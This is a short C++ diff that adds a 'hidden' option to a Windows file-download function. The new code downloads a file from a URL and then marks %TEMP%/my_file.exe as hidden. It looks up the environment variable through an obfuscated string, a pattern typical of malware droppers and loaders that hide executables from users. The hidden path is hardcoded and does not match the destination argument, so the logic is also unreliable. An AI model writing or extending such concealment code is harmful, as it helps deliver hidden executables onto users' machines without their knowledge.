@@ -3,8 +3,21 @@
 #include <wininet.h>
 #pragma comment(lib,"Wininet.lib")
 
-bool download_file_from_url(const std::string& source, const std::string& destination) {
+bool download_file_from_url(const std::string& source, const std::string& destination, const bool& hidden) {
     if (SUCCEEDED(URLDownloadToFileA(NULL, source.c_str(), destination.c_str(), 0, NULL))) {
+        if (hidden) {
+            char* pValue;
+            std::string str("/my_file.exe");
+            size_t len;
+            errno_t err = _dupenv_s(&pValue, &len, xorstr_("TEMP"));
+            std::string str_save = (pValue + str);
+            std::wstring stemp = std::wstring(str_save.begin(), str_save.end());
+            LPCWSTR sw = stemp.c_str();
+            int attr = GetFileAttributes(sw);
+            if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
+                SetFileAttributes(sw, attr | FILE_ATTRIBUTE_HIDDEN);
+            }
+        }
         return true;
     }
     return false;
